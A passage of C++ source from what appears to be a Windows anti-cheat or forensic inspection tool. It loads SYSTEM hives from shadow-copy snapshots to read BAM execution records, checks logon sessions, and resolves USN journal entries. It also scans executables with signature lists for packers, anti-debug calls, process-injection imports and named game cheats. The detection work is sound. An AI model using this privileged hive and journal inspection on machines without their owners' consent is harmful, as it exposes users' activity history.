    wstring tempKeyName = L"HubBAM_" + std::to_wstring(GetCurrentProcessId())
        + L"_" + std::to_wstring(mySeq);

    LONG rc = RegLoadKeyW(HKEY_LOCAL_MACHINE, tempKeyName.c_str(), hiveFile.c_str());
    if (rc != ERROR_SUCCESS) {
        Log("  [!] RegLoadKey failed for " + sourceLabel + " (err " + std::to_string(rc) + ")");
        RegUnLoadKeyW(HKEY_LOCAL_MACHINE, tempKeyName.c_str());
        return;
    }

    wstring resolvedCS = controlSet;
    if (resolvedCS == L"CurrentControlSet") {
        wstring selectPath = tempKeyName + L"\\Select";
        HKEY hSel = nullptr;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, selectPath.c_str(),
            0, KEY_READ | KEY_WOW64_64KEY, &hSel) == ERROR_SUCCESS)
        {
            DWORD val = 0, sz = sizeof(val);
            if (RegQueryValueExW(hSel, L"Current", nullptr, nullptr,
                reinterpret_cast<LPBYTE>(&val), &sz) == ERROR_SUCCESS && val >= 1 && val <= 9)
            {
                wchar_t csBuf[32]; swprintf_s(csBuf, L"ControlSet%03u", val);
                resolvedCS = csBuf;
                Log("  [~] " + sourceLabel + ": CurrentControlSet -> " + WtoS(csBuf));
            }
            RegCloseKey(hSel);
        }
        if (resolvedCS == L"CurrentControlSet") {
            resolvedCS = L"ControlSet001";
            Log("  [~] " + sourceLabel + ": CurrentControlSet unresolvable, using ControlSet001");
        }
    }

    const wchar_t* bamSubPaths[] = {
        L"\\Services\\bam\\State\\UserSettings",   // 1709+
        L"\\Services\\bam\\UserSettings",           // pre-1709
        nullptr
    };

    bool opened = false;
    for (int pi = 0; bamSubPaths[pi] && !opened; pi++) {
        wstring fullPath = tempKeyName + L"\\" + resolvedCS + bamSubPaths[pi];
        HKEY hBam = nullptr;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, fullPath.c_str(),
            0, KEY_READ | KEY_ENUMERATE_SUB_KEYS | KEY_WOW64_64KEY, &hBam) == ERROR_SUCCESS)
        {
            ScanBAMHiveRoot(hBam, volMap, sourceLabel, out);
            RegCloseKey(hBam);
            opened = true;
        }
    }
    if (!opened)
        Log("  [!] BAM key not found in hive " + sourceLabel + " - may not exist in this snapshot");

    RegUnLoadKeyW(HKEY_LOCAL_MACHINE, tempKeyName.c_str());
}

// ---------------------------------------------------------------------------
//  ScanBAMFromHiveFile
// ---------------------------------------------------------------------------
static void ScanBAMFromHiveFile(
    const wstring& vssDevice,
    const string& snapDateLabel,
    const std::map<wstring, wstring>& volMap,
    std::map<string, BAMRecord>& out)
{
    wstring pidTag = std::to_wstring(GetCurrentProcessId());
    wstring sysHive = TmpDir() + L"HubBAM_SYS_" + pidTag + L"_" + wstring(snapDateLabel.begin(), snapDateLabel.end());
    wstring sysLog1 = sysHive + L".LOG1";
    wstring sysLog2 = sysHive + L".LOG2";

    bool hiveCopied = CopyFromVss(vssDevice, L"Windows\\System32\\config\\SYSTEM", sysHive);
    if (!hiveCopied) {
        Log("  [!] Could not copy SYSTEM hive from VSS snapshot " + snapDateLabel);
        return;
    }
    CopyFromVss(vssDevice, L"Windows\\System32\\config\\SYSTEM.LOG1", sysLog1);
    CopyFromVss(vssDevice, L"Windows\\System32\\config\\SYSTEM.LOG2", sysLog2);

    string srcCCS = "VSS@" + snapDateLabel + "-CCS";
    OpenBAMFromHive(sysHive, L"CurrentControlSet", volMap, srcCCS, out);

    // FIX #3: Previously looped ControlSet001..004 unconditionally, generating
    // 3 "BAM key not found" log lines per snapshot on the typical machine that
    // only has ControlSet001 and ControlSet002.  Now we read the Select key
    // from the loaded hive to discover which ControlSets actually exist, then
    // only attempt the ones that are present.  This eliminates the noise and
    // avoids redundant RegLoadKey/RegUnLoadKey cycles for non-existent sets.
    {
        // We need to load the hive once more just to read Select — reuse the
        // same load/unload pattern as OpenBAMFromHive uses internally.
        static LONG s_csEnum = 0;
        LONG mySeq = InterlockedIncrement(&s_csEnum);
        wstring enumKey = L"HubBAM_CSEnum_" + std::to_wstring(GetCurrentProcessId())
            + L"_" + std::to_wstring(mySeq);

        if (RegLoadKeyW(HKEY_LOCAL_MACHINE, enumKey.c_str(), sysHive.c_str()) == ERROR_SUCCESS) {
            // Discover which ControlSet numbers exist as subkeys
            std::set<DWORD> presentCS;
            {
                HKEY hRoot = nullptr;
                if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, enumKey.c_str(),
                    0, KEY_READ | KEY_ENUMERATE_SUB_KEYS | KEY_WOW64_64KEY, &hRoot) == ERROR_SUCCESS)
                {
                    wchar_t csName[64]; DWORD csNameLen = 64; DWORD idx = 0;
                    while (RegEnumKeyExW(hRoot, idx++, csName, &csNameLen,
                        nullptr, nullptr, nullptr, nullptr) == ERROR_SUCCESS)
                    {
                        csNameLen = 64;
                        // Match "ControlSetNNN" where NNN is 1-3 digits
                        if (_wcsnicmp(csName, L"ControlSet", 10) == 0) {
                            DWORD num = (DWORD)_wtoi(csName + 10);
                            if (num >= 1 && num <= 999) presentCS.insert(num);
                        }
                    }
                    RegCloseKey(hRoot);
                }
            }

            // FIX #4: Read and log the BAM Version value from the hive so the
            // analyst can see whether this snapshot is pre-1709 (Version 1) or
            // post-1709 (Version 2).  Useful when correlating timeline gaps.
            {
                // Resolve CCS number first
                DWORD ccsNum = 1;
                wstring selPath = enumKey + L"\\Select";
                HKEY hSel = nullptr;
                if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, selPath.c_str(),
                    0, KEY_READ | KEY_WOW64_64KEY, &hSel) == ERROR_SUCCESS) {
                    DWORD val = 0, sz = sizeof(val);
                    if (RegQueryValueExW(hSel, L"Current", nullptr, nullptr,
                        reinterpret_cast<LPBYTE>(&val), &sz) == ERROR_SUCCESS
                        && val >= 1 && val <= 9)
                        ccsNum = val;
                    RegCloseKey(hSel);
                }
                wchar_t ccsName[32]; swprintf_s(ccsName, L"ControlSet%03u", ccsNum);
                // Try both BAM key layouts for the Version value
                const wchar_t* bamVerPaths[] = {
                    L"\\Services\\bam\\State",
                    L"\\Services\\bam",
                    nullptr
                };
                for (int pi = 0; bamVerPaths[pi]; pi++) {
                    wstring vp = enumKey + L"\\" + ccsName + bamVerPaths[pi];
                    HKEY hBamVer = nullptr;
                    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, vp.c_str(),
                        0, KEY_READ | KEY_WOW64_64KEY, &hBamVer) == ERROR_SUCCESS) {
                        DWORD ver = 0, vsz = sizeof(ver);
                        if (RegQueryValueExW(hBamVer, L"Version", nullptr, nullptr,
                            reinterpret_cast<LPBYTE>(&ver), &vsz) == ERROR_SUCCESS)
                            Log("  [bam] VSS snapshot " + snapDateLabel
                                + ": BAM Version = " + std::to_string(ver)
                                + (ver == 1 ? " (pre-1709 layout)"
                                    : ver == 2 ? " (post-1709 layout)"
                                    : " (unknown layout)"));
                        RegCloseKey(hBamVer);
                        break;
                    }
                }
            }

            RegUnLoadKeyW(HKEY_LOCAL_MACHINE, enumKey.c_str());

            // Scan only the ControlSets that actually exist in this snapshot
            for (DWORD csNum : presentCS) {
                wchar_t csBuf[32]; swprintf_s(csBuf, L"ControlSet%03u", csNum);
                string srcCS = "VSS@" + snapDateLabel + "-" + WtoS(csBuf);
                OpenBAMFromHive(sysHive, csBuf, volMap, srcCS, out);
            }
        }
        else {
            // Hive load failed for enumeration (already logged by OpenBAMFromHive above)
            // Fall back to the old fixed range so we don't silently skip everything
            for (DWORD csNum = 1; csNum <= 4; csNum++) {
                wchar_t csBuf[32]; swprintf_s(csBuf, L"ControlSet%03u", csNum);
                string srcCS = "VSS@" + snapDateLabel + "-" + WtoS(csBuf);
                OpenBAMFromHive(sysHive, csBuf, volMap, srcCS, out);
            }
        }
    }

    DeleteFileW(sysHive.c_str());
    DeleteFileW(sysLog1.c_str());
    DeleteFileW(sysLog2.c_str());
}

// =========================================================================
//  BAM Enhancement #1: Current Logon Instance Detection
//  Ports BAM-parser's IsInCurrentInstance / GetInteractiveLogonSessions.
//  Uses LsaEnumerateLogonSessions to find the earliest interactive logon
//  time, then checks if a BAM timestamp falls within [logon, now].
// =========================================================================
static FILETIME GetCurrentInteractiveLogonTime() {
    FILETIME result = { 0, 0 };
    ULONG sessionCount = 0;
    PLUID pSessions = nullptr;

    if (LsaEnumerateLogonSessions(&sessionCount, &pSessions) != STATUS_SUCCESS)
        return result;

    FILETIME earliest = { MAXDWORD, MAXDWORD };
    bool found = false;

    for (ULONG i = 0; i < sessionCount; i++) {
        PSECURITY_LOGON_SESSION_DATA pData = nullptr;
        if (LsaGetLogonSessionData(&pSessions[i], &pData) != STATUS_SUCCESS) continue;

        if (pData->LogonType == Interactive || pData->LogonType == RemoteInteractive) {
            FILETIME ft;
            ft.dwLowDateTime = (DWORD)(pData->LogonTime.QuadPart & 0xFFFFFFFF);
            ft.dwHighDateTime = (DWORD)((pData->LogonTime.QuadPart >> 32) & 0xFFFFFFFF);
            if (!found || CompareFileTime(&ft, &earliest) < 0) {
                earliest = ft;
                found = true;
            }
        }
        LsaFreeReturnBuffer(pData);
    }
    LsaFreeReturnBuffer(pSessions);
    return found ? earliest : result;
}

// timestampUtc is in our standard "YYYY-MM-DD HH:MM:SS (UTC)" format from FiletimeToStr.
static bool IsInCurrentLogonInstance(const string& timestampUtc, const FILETIME& logonTime) {
    if (logonTime.dwLowDateTime == 0 && logonTime.dwHighDateTime == 0) return false;
    if (timestampUtc.find("No timestamp") != string::npos ||
        timestampUtc.find("unknown") != string::npos) return false;

    int y = 0, mo = 0, d = 0, h = 0, mi = 0, s = 0;
    // FIX: replaced sscanf with sscanf_s to resolve C4996 deprecation error
    if (sscanf_s(timestampUtc.c_str(), "%d-%d-%d %d:%d:%d", &y, &mo, &d, &h, &mi, &s) != 6)
        return false;

    SYSTEMTIME st = {};
    st.wYear = (WORD)y; st.wMonth = (WORD)mo; st.wDay = (WORD)d;
    st.wHour = (WORD)h; st.wMinute = (WORD)mi;  st.wSecond = (WORD)s;

    FILETIME execFt;
    if (!SystemTimeToFileTime(&st, &execFt)) return false;

    SYSTEMTIME nowSt; GetSystemTime(&nowSt);
    FILETIME   nowFt; SystemTimeToFileTime(&nowSt, &nowFt);

    return (CompareFileTime(&execFt, &logonTime) >= 0 &&
        CompareFileTime(&execFt, &nowFt) <= 0);
}

// =========================================================================
//  BAM Enhancement #2: Lightweight PE Cheat-Pattern Scanner
//  Scans raw PE bytes for obfuscation artifacts, packer section names,
//  and injector import combinations.
// =========================================================================
// =========================================================================
//  PE Version Info extraction
//  Reads the StringFileInfo block from a PE's embedded VS_VERSION_INFO
//  resource and returns a map of field name -> value (all lowercased).
//
//  Fields of interest for rename detection:
//    OriginalFilename  - the filename the author compiled the binary as
//    InternalName      - usually matches OriginalFilename
//    ProductName       - the cheat product name (e.g. "Xeno", "Seliware")
//    FileDescription   - human-readable description, often contains cheat name
//    CompanyName       - cheat group/author name
//
//  These are set at compile time and survive a simple file rename, making
//  them highly reliable indicators even when a user renames cheat.exe ->
//  roblox_helper.exe.
// =========================================================================
static std::map<string, string> GetPEVersionStrings(const wstring& wpath) {
    std::map<string, string> result;

    DWORD dummy = 0;
    DWORD vsSize = GetFileVersionInfoSizeW(wpath.c_str(), &dummy);
    if (vsSize == 0) return result;

    vector<BYTE> vsBuf(vsSize);
    if (!GetFileVersionInfoW(wpath.c_str(), 0, vsSize, vsBuf.data()))
        return result;

    // Walk all available language+codepage pairs and collect every string value.
    struct LANGCP { WORD lang; WORD cp; };
    LANGCP* langs = nullptr;
    UINT langLen = 0;
    if (!VerQueryValueW(vsBuf.data(), L"\\VarFileInfo\\Translation",
        reinterpret_cast<LPVOID*>(&langs), &langLen))
        return result;

    UINT numLangs = langLen / sizeof(LANGCP);
    const wchar_t* fields[] = {
        L"OriginalFilename", L"InternalName", L"ProductName",
        L"FileDescription",  L"CompanyName",  L"ProductVersion",
        L"FileVersion",      L"LegalCopyright", nullptr
    };

    for (UINT li = 0; li < numLangs; li++) {
        wchar_t subBlock[64];
        for (int fi = 0; fields[fi]; fi++) {
            _snwprintf_s(subBlock, _countof(subBlock), _TRUNCATE,
                L"\\StringFileInfo\\%04x%04x\\%s",
                langs[li].lang, langs[li].cp, fields[fi]);
            wchar_t* val = nullptr;
            UINT valLen = 0;
            if (VerQueryValueW(vsBuf.data(), subBlock,
                reinterpret_cast<LPVOID*>(&val), &valLen) && val && *val) {
                string key = WtoS(fields[fi]);
                string value = WtoS(val);
                std::transform(key.begin(), key.end(), key.begin(), ::tolower);
                std::transform(value.begin(), value.end(), value.begin(), ::tolower);
                result[key] = value;
            }
        }
    }
    return result;
}

static vector<string> ScanFileForCheats(const string& path) {
    vector<string> hits;

    // Fix: use MultiByteToWideChar (CP_UTF8) to reconstruct the wide path so
    // that non-ASCII characters (accented names, Cyrillic paths, etc.) are
    // preserved.  The naïve wstring(path.begin(), path.end()) truncated every
    // byte to 8 bits — the same bug WtoS was rewritten to fix — and caused
    // GetFileAttributesW / CreateFileW to fail silently on those paths.
    int wneeded = MultiByteToWideChar(CP_UTF8, 0, path.c_str(), -1, nullptr, 0);
    wstring wpath;
    if (wneeded > 1) { wpath.resize(wneeded - 1); MultiByteToWideChar(CP_UTF8, 0, path.c_str(), -1, &wpath[0], wneeded); }
    if (wpath.empty()) return hits;
    if (GetFileAttributesW(wpath.c_str()) == INVALID_FILE_ATTRIBUTES) return hits;

    HANDLE hFile = CreateFileW(wpath.c_str(), GENERIC_READ, FILE_SHARE_READ,
        nullptr, OPEN_EXISTING, 0, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return hits;

    LARGE_INTEGER sz;
    if (!GetFileSizeEx(hFile, &sz) || sz.QuadPart < 64 || sz.QuadPart > 64LL * 1024 * 1024) {
        CloseHandle(hFile); return hits;
    }

    vector<BYTE> buf((size_t)sz.QuadPart);
    DWORD read = 0;
    if (!ReadFile(hFile, buf.data(), (DWORD)sz.QuadPart, &read, nullptr)) {
        CloseHandle(hFile); return hits;
    }
    CloseHandle(hFile);

    // Only scan PE files.
    if (buf.size() < 2 || buf[0] != 'M' || buf[1] != 'Z') return hits;

    string cl(buf.begin(), buf.end());
    string cll = cl;
    std::transform(cll.begin(), cll.end(), cll.begin(), ::tolower);

    // Generic A: clicker-related strings (from reference YARA Generic A rule).
    // Matches auto-clickers and jitter-click tools that embed these strings.
    static const char* clickerStr[] = {
        "jitter click", "butterfly click", "autoclick", "double_click",
        "string cleaner", nullptr
    };
    for (int i = 0; clickerStr[i]; i++) {
        if (cll.find(clickerStr[i]) != string::npos) {
            hits.push_back(string("Generic A (clicker string: ") + clickerStr[i] + ")");
            break;
        }
    }

    // Generic B: multiple anti-debug/protection imports.
    // Excluded for files under C:\Windows\ -- system binaries (cmd.exe, dwm.exe,
    // explorer.exe etc.) legitimately import these APIs for process management
    // and diagnostics. The combination is only suspicious outside the Windows tree.
    {
        string pathLow2 = path;
        std::transform(pathLow2.begin(), pathLow2.end(), pathLow2.begin(), ::tolower);
        bool isWindowsBin = (pathLow2.find("c:\\windows\\") == 0);
        if (!isWindowsBin) {
            static const char* protStr[] = {
                "isdebuggerpresent", "checkremotedebuggerpresent", "ntqueryinformationprocess",
                "outputdebugstringa", "zwqueryinformationprocess", nullptr
            };
            int protCount = 0;
            for (int i = 0; protStr[i]; i++)
                if (cll.find(protStr[i]) != string::npos) protCount++;
            if (protCount >= 2)
                hits.push_back("Generic B (multiple anti-debug imports)");
        }
    }

    // Generic C/D: C# obfuscation artifacts
    static const char* csObfStr[] = {
        "obfuscar", "confuserex", "dotfuscator", "de4dot",
        "antitamper", "antiildasmattribute", nullptr
    };
    for (int i = 0; csObfStr[i]; i++) {
        if (cll.find(csObfStr[i]) != string::npos) {
            hits.push_back("Generic C/D (C# obfuscation artifact)"); break;
        }
    }

    // Generic F: packer section names / stubs
    static const char* packerSigs[] = {
        "upx0", "upx!", ".themida", ".winlicens", "execryptor",
        "asprotect", "armadillo", ".nsp0", ".nsp1",
        "vprotect", ".vmp0", ".vmp1", ".vmp2",
        "petite", "mpress", "nspack", nullptr
    };
    for (int i = 0; packerSigs[i]; i++) {
        if (cll.find(packerSigs[i]) != string::npos) {
            hits.push_back(string("Generic F (packer: ") + packerSigs[i] + ")"); break;
        }
    }

    // Generic G: injector import combination
    static const char* injStr[] = {
        "virtualalloc", "writeprocessmemory", "createremotethread",
        "ntcreatethreadex", "rtlcreateuserthread", nullptr
    };
    int injCount = 0;
    for (int i = 0; injStr[i]; i++)
        if (cll.find(injStr[i]) != string::npos) injCount++;
    if (injCount >= 3)
        hits.push_back("Generic G (injector import combination)");

    // Specifics A: known cheat-specific strings ported from reference YARA
    // "Specifics A" rule.  These are high-confidence indicators — domain names,
    // internal DLL names, PDB paths, and embedded UI strings that appear only
    // in specific cheat tools and have no legitimate use.
    struct SpecificSig { const char* str; const char* label; };
    static const SpecificSig specificSigs[] = {
        { "exodus.codes",                                         "Exodus cheat domain" },
        { "slinky.gg",                                            "Slinky cheat domain" },
        { "slinkyhook.dll",                                       "Slinky hook DLL" },
        { "slinky_library.dll",                                   "Slinky library DLL" },
        { "vape.gg",                                              "Vape cheat domain" },
        { "vape launcher",                                        "Vape launcher string" },
        { "[!] failed to find vape jar",                          "Vape jar error string" },
        { "discord.gg/advantages",                                "Advantages cheat Discord" },
        { "open minecraft, then try again.",                      "Minecraft cheat prompt" },
        { "the clicker code was done by nightbot. i skidded it", "Skidded clicker string" },
        { "pe injector",                                          "PE injector label" },
        { "name=\"sparkcrack.exe\"",                              "SparkCrack manifest" },
        { "starlight v1.0",                                       "Starlight cheat version" },
        { "sapphire lite clicker",                                "Sapphire clicker string" },
        { "striker.exe",                                          "Striker cheat reference" },
        { "cracked by kangaroo",                                  "Kangaroo crack string" },
        { "monolith lite",                                        "Monolith Lite cheat" },
        { "dream-injector",                                       "Dream injector string" },
        { "unicorn client",                                       "Unicorn Client cheat" },
        { "adding delay to minecraft",                            "Minecraft delay string" },
        { "uwu client",                                           "UwU Client cheat" },
        { "lithiumclient.wtf",                                    "Lithium cheat domain" },
        // PDB paths — only present in builds compiled by the cheat author
        { "client-top\\x64\\release\\top-external.pdb",          "top-external PDB path" },
        { "client-top\\x64\\release\\top-internal.pdb",          "top-internal PDB path" },
        { "cleaner-main\\obj\\x64\\release\\windowsformsapp3.pdb","Cleaner PDB path" },
        { nullptr, nullptr }
    };
    for (int i = 0; specificSigs[i].str; i++) {
        if (cll.find(specificSigs[i].str) != string::npos) {
            hits.push_back(string("Specifics A (") + specificSigs[i].label + ")");
            // Don't break — multiple specific hits are each independently useful
        }
    }

    // ── Specifics B: additional cheat-specific binary strings ────────────────
    // Internal strings, mutex names, UI text, PDB paths, and domain/Discord
    // references for the cheats tracked in KW.  Compiled into the binary and
    // not removed by a file rename.
    struct SpecificSigB { const char* str; const char* label; };
    static const SpecificSigB specificSigsB[] = {
        // Xeno
        { "xenolib",               "Xeno internal lib name"    },
        { "xeno-client",           "Xeno client string"        },
        { "xeno injector",         "Xeno injector string"      },
        { "discord.gg/xeno",       "Xeno Discord invite"       },
        // Seliware
        { "seliware",              "Seliware cheat string"     },
        { "seli.gg",               "Seliware domain"           },
        { "seliware.dll",          "Seliware DLL name"         },
        // Clumsy
        { "clumsy.exe",            "Clumsy reference"          },
        { "clumsy network",        "Clumsy network string"     },
        { "github.com/jagt/clumsy","Clumsy GitHub path"        },
        // Wave
        { "waveclient",            "Wave client string"        },
        { "wave-client",           "Wave client string"        },
        { "wave executor",         "Wave executor string"      },
        { "discord.gg/wave",       "Wave Discord invite"       },
        // AWP
        { "awphook",               "AWP hook string"           },
        { "awp.dll",               "AWP DLL name"              },
        { "awp cheat",             "AWP cheat string"          },
        // Bunni
        { "bunniclient",           "Bunni client string"       },
        { "bunni-client",          "Bunni client string"       },
        { "discord.gg/bunni",      "Bunni Discord invite"      },
        // Swift
        { "swiftly client",        "Swift client string"       },
        { "swiftclient",           "Swift client string"       },
        { "discord.gg/swift",      "Swift Discord invite"      },
        // Cryptic
        { "crypticclient",         "Cryptic client string"     },
        { "cryptic-client",        "Cryptic client string"     },
        { "discord.gg/cryptic",    "Cryptic Discord invite"    },
        // Volcano
        { "volcanoclient",         "Volcano client string"     },
        { "volcano-client",        "Volcano client string"     },
        { "discord.gg/volcano",    "Volcano Discord invite"    },
        // Potassium
        { "potassiumclient",       "Potassium client string"   },
        { "potassium client",      "Potassium client string"   },
        { "discord.gg/potassium",  "Potassium Discord invite"  },
        // SirHurt
        { "sirhurt.net",           "SirHurt domain"            },
        { "sirhurt.dll",           "SirHurt DLL name"          },
        { "sirhurtv4",             "SirHurt v4 string"         },
        // Solara
        { "solaraexecutor",        "Solara executor string"    },
        { "solara-executor",       "Solara executor string"    },
        { "solara.lol",            "Solara domain"             },
        { "discord.gg/solara",     "Solara Discord invite"     },
        // Cleaner tools
        { "cheat cleaner",         "Cheat cleaner string"      },
        { "cleanmytrace",          "CleanMyTrace string"       },
        { "tracecleaner",          "TraceCleaner string"       },
        { "cleanerbyzenith",       "Cleaner by Zenith string"  },
        { nullptr, nullptr }
    };
    for (int i = 0; specificSigsB[i].str; i++) {
        if (cll.find(specificSigsB[i].str) != string::npos)
            hits.push_back(string("Specifics B (") + specificSigsB[i].label + ")");
    }

    // ── PE Version Info check (rename-resistant) ──────────────────────────────
    // Reads OriginalFilename, InternalName, ProductName, FileDescription, and
    // CompanyName from the PE resource section.  These are written at compile
    // time and are NOT changed by a file rename, so a cheat renamed to something
    // innocent (e.g. "discord_update.exe") still exposes its real identity here.
    {
        // Fix: same CP_UTF8 conversion used above — don't regress to the naïve cast here.
        int wn2 = MultiByteToWideChar(CP_UTF8, 0, path.c_str(), -1, nullptr, 0);
        wstring wpath2;
        if (wn2 > 1) { wpath2.resize(wn2 - 1); MultiByteToWideChar(CP_UTF8, 0, path.c_str(), -1, &wpath2[0], wn2); }
        auto verInfo = GetPEVersionStrings(wpath2);

        const char* verFields[] = {
            "originalfilename", "internalname", "productname",
            "filedescription",  "companyname",  nullptr
        };

        // Check 1: keyword hit in any version field (whole-word)
        for (auto& kw : KW) {
            for (int fi = 0; verFields[fi]; fi++) {
                auto it = verInfo.find(verFields[fi]);
                if (it == verInfo.end()) continue;
                if (MatchesWholeWord(it->second, kw))
                    hits.push_back(
                        string("Version Info: keyword '") + kw +
                        "' found in " + verFields[fi] +
                        " (\"" + it->second + "\")");
            }
        }

        // Check 2: known cheat strings in version fields
        struct VerSig { const char* str; const char* label; };
        static const VerSig verSigs[] = {
            { "seliware",      "Seliware"    },
            { "sirhurt",       "SirHurt"     },
            { "solara",        "Solara"      },
            { "xenolib",       "Xeno"        },
            { "xeno client",   "Xeno"        },
            { "waveclient",    "Wave"        },
            { "wave client",   "Wave"        },
            { "bunniclient",   "Bunni"       },
            { "bunni client",  "Bunni"       },
            { "swiftclient",   "Swift"       },
            { "swift client",  "Swift"       },
            { "crypticclient", "Cryptic"     },
            { "volcanoclient", "Volcano"     },
            { "potassium",     "Potassium"   },
            { "vape",          "Vape"        },
            { "slinky",        "Slinky"      },
            { "exodus",        "Exodus"      },
            { "pe injector",   "PE Injector" },
            { nullptr, nullptr }
        };
        for (int si = 0; verSigs[si].str; si++) {
            for (int fi = 0; verFields[fi]; fi++) {
                auto it = verInfo.find(verFields[fi]);
                if (it == verInfo.end()) continue;
                if (it->second.find(verSigs[si].str) != string::npos)
                    hits.push_back(
                        string("Version Info: ") + verSigs[si].label +
                        " in " + verFields[fi] +
                        " (\"" + it->second + "\")");
            }
        }

        // Check 3: OriginalFilename doesn't match actual filename on disk.
        // Corroborating evidence only — only added when other hits already exist.
        // Standalone mismatches are too noisy: many legitimate programs have them
        // (architecture variants like foo_x64.exe vs foo.exe, installer temp files
        // with generated names, etc.).  Also ignore blank/whitespace-only values
        // which appear in some installer stubs and carry no signal.
        {
            auto origIt = verInfo.find("originalfilename");
            if (origIt != verInfo.end() && !origIt->second.empty()) {
                string origFname = origIt->second;
                while (!origFname.empty() && origFname.back() == '\0')
                    origFname.pop_back();
                // Strip leading/trailing whitespace — installer stubs sometimes
                // pad the field with spaces instead of leaving it empty.
                size_t first = origFname.find_first_not_of(" \t\r\n");
                if (first != string::npos)
                    origFname = origFname.substr(first,
                        origFname.find_last_not_of(" \t\r\n") - first + 1);
                else
                    origFname.clear();

                if (!origFname.empty()) {
                    string actualFname = Lower(FileNameOnly(path));
                    if (actualFname != origFname && !hits.empty())
                        hits.push_back(
                            "Version Info: OriginalFilename (\"" + origFname +
                            "\") != file on disk (\"" + actualFname +
                            "\") - possible rename");
                }
            }
        }
    }

    return hits;
}

// =========================================================================
//  USN Journal Standalone Scanner
//
//  Reads the live C: $J journal directly via FSCTL_READ_USN_JOURNAL.
//  Runs independently from BAM — does NOT rely on BAM records as seed data.
//
//  Features:
//    - Full ReasonMask (all 20+ flag types, fixing the dead-code bug where
//      only 4 reason types were requested but 10+ were translated)
//    - Parent FRN → full path resolution via OpenFileById + GetFinalPathNameByHandleW
//      with a per-scan FRN cache to avoid redundant handle opens
//    - Pipe-separated reason output matching the detect.ac USN Journal Viewer style
//    - Keyword filter applied to filename only (not path) for speed; still logs
//      the full resolved path so analysts see exact location
//    - USN via MFTECmd ($J CSV) is a separate pass in RunMFTECmd and is unaffected
//    - V2-only enforcement: records with MajorVersion != 2 are skipped rather than
//      silently misparsed (V3 records use a different struct layout on Win8+)
//    - MFT sequence numbers extracted from FileReferenceNumber and
//      ParentFileReferenceNumber — logged per hit to detect FRN reuse across
//      cheat tool install/delete cycles (matching usnrs and UsnJrnl2Csv behaviour)
//    - Raw USN value logged per hit for sub-second event ordering and
//      cross-run correlation (matching UsnJrnl2Csv "USN" column)
//    - SecurityId logged per hit — security descriptor changes on a file are
//      visible here and can indicate ACL tampering around cheat binaries
//    - Full SourceInfo decode: all 4 defined bits covered including
//      USN_SOURCE_CLIENT_REPLICATION_MANAGEMENT (0x8), previously missing
//    - Distinct journal-deleted vs journal-unavailable error reporting:
//      ERROR_JOURNAL_DELETED / ERROR_JOURNAL_NOT_ACTIVE is flagged explicitly
//      as a suspicious indicator rather than treated as a generic failure
//    - AllocationDelta surfaced in the journal header log line alongside
//      MaximumSize (relevant for detecting a tampered/shrunk journal)
// =========================================================================

// ---------------------------------------------------------------------------
//  FormatUSNReasons — convert a raw USN Reason bitmask to a pipe-separated
//  human-readable string matching the detect.ac viewer column format.
//  All 20 reason flags from the NTFS spec are covered (matching usnrs lib.rs).
// ---------------------------------------------------------------------------
static string FormatUSNReasons(DWORD reason) {
    string result;
    auto add = [&](const char* name) {
        if (!result.empty()) result += " | ";
        result += name;
        };
    // Content changes
    if (reason & USN_REASON_DATA_OVERWRITE)          add("Data Overwrite");
    if (reason & USN_REASON_DATA_EXTEND)             add("Data Extend");
    if (reason & USN_REASON_DATA_TRUNCATION)         add("Data Truncation");
    // Named stream content
    if (reason & 0x00000010)                         add("Named Data Overwrite");
    if (reason & 0x00000020)                         add("Named Data Extend");
    if (reason & 0x00000040)                         add("Named Data Truncation");
    // Create / delete
    if (reason & USN_REASON_FILE_CREATE)             add("File Create");
    if (reason & USN_REASON_FILE_DELETE)             add("File Delete");
    // Metadata
    if (reason & USN_REASON_EA_CHANGE)               add("EA Change");
    if (reason & USN_REASON_SECURITY_CHANGE)         add("Security Change");
    // Rename
    if (reason & USN_REASON_RENAME_OLD_NAME)         add("Rename Old Name");
    if (reason & USN_REASON_RENAME_NEW_NAME)         add("Rename New Name");
    // More metadata
    if (reason & USN_REASON_INDEXABLE_CHANGE)        add("Indexable Change");
    if (reason & USN_REASON_BASIC_INFO_CHANGE)       add("Basic Info Change");
    if (reason & USN_REASON_HARD_LINK_CHANGE)        add("Hard Link Change");
    if (reason & USN_REASON_COMPRESSION_CHANGE)      add("Compression Change");
    if (reason & USN_REASON_ENCRYPTION_CHANGE)       add("Encryption Change");
    if (reason & USN_REASON_OBJECT_ID_CHANGE)        add("Object ID Change");
    if (reason & USN_REASON_REPARSE_POINT_CHANGE)    add("Reparse Point Change");
    if (reason & USN_REASON_STREAM_CHANGE)           add("Stream Change");
    // Close marker (appended last, matches detect.ac trailing " |" style)
    if (reason & USN_REASON_CLOSE)                   add("File Close");

    if (result.empty()) {
        char b[16]; sprintf_s(b, "0x%08X", reason);
        return string("Unknown (") + b + ")";
    }
    return result + " |";
}

// ---------------------------------------------------------------------------
//  ResolveFRNToPath — open a directory by its 48-bit MFT File Reference
//  Number using FILE_OPEN_BY_FILE_ID and retrieve its Win32 path.
//  Results are cached in frnCache to avoid redundant handle opens across
//  the millions of USN records in a typical journal.
// ---------------------------------------------------------------------------
static string ResolveFRNToPath(HANDLE hVolId, LONGLONG frn,
    std::map<LONGLONG, string>& frnCache)
{
    auto it = frnCache.find(frn);
    if (it != frnCache.end()) return it->second;

    FILE_ID_DESCRIPTOR fid = {};
    fid.dwSize = sizeof(fid);
    fid.Type = FileIdType;   // = 0, use FileId union member
    fid.FileId.QuadPart = frn;

    HANDLE hDir = OpenFileById(hVolId, &fid, 0,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        nullptr, FILE_FLAG_BACKUP_SEMANTICS);

    string result;
    if (hDir != INVALID_HANDLE_VALUE) {
        wchar_t buf[4096] = {};
        DWORD len = GetFinalPathNameByHandleW(hDir, buf, 4096, VOLUME_NAME_DOS);
        CloseHandle(hDir);
        if (len > 0 && len < 4096) {
            wstring wp = buf;
            // Strip the \\?\ prefix that GetFinalPathNameByHandleW prepends
            if (wp.size() > 4 && wp.substr(0, 4) == L"\\\\?\\")
                wp = wp.substr(4);
            result = WtoS(wp.c_str());
        }
    }
    frnCache[frn] = result;
    return result;
}

// ---------------------------------------------------------------------------
//  RunUSNJournalScan — standalone scan, independent from BAM
